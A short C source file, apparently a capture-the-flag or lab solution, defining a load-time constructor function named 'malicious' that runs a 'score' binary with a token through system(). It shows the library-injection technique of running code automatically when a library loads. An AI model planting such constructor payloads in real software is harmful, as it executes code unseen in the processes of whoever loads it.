#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1");
}
